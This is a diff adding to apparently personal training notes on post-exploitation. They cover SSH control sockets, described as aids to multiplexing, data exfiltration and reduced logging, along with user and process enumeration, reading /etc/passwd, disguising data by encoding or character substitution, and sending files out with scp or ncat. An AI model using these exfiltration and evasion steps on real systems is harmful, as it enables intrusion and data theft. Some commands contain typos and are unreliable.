@@ -155,7 +155,45 @@ print(buf)
                                                 ssh -i <stolen key of user> <user>@<ip>
                         
 #### Control Sockets
+            Benefits: 
+                        Multiplexing
+                        Data Exfiltration
+                        Less Logging
+##### Demo for Control Sockets
+            ssh -MS /tmp/gray student@10.50.32.38
+                        [gray is a file in a temp that is a socket file]
+            ssh -S /tmp/gray <placeholder>
+                        [will connect to the box the original socket was created with]
+            ssh -MS /tmp/gray -O[option] cancel <user>@<ip> 
+            
+            ssh -S /tmp/gray <placeholder? -O forward -L<port>:<ip>:<port>
+
+            ssh -S /tmp/gray dummy -O forward -D9050
 
 #### Enumeration
-
+            To find all the users on a box, processes, 
+            Win:
+                        net user
+                        tasklist /v
+                        tasklist /svc
+		ipconfig /all
+            Linux:
+                        cat /etc/passwd
+                        ps -elf
+                        chkconfig			# SysV
+                        systemtcl --type=service            # SystemD
+		ipconfig -a			# SysV
+  		ip a			$ SystemD
 #### Exfiltration
+	ssh <user>@<host> | tee
+ 	Windows
+  		type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
+		certutil -encode <file> encoded.b64
+  
+  	Linux
+   		cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+		cat <file>> | base64
+  
+  	Encrypted Transport
+   		scp <source> <destination>
+		ncat --ssl <ip> <port> < <file>
